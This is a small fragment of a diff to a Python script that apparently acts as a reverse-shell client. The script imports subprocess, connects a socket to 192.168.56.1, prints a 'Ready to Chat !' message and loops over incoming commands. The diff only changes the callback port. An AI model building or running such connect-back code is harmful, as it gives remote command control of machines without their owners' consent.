@@ -6,7 +6,7 @@ import subprocess
 import os
 try:
 	soc=socket.socket()
-	soc.connect(('192.168.56.1',55555))
+	soc.connect(('192.168.56.1',9912))
 	print('Ready to Chat !')
 	cmd=''
 	while True:
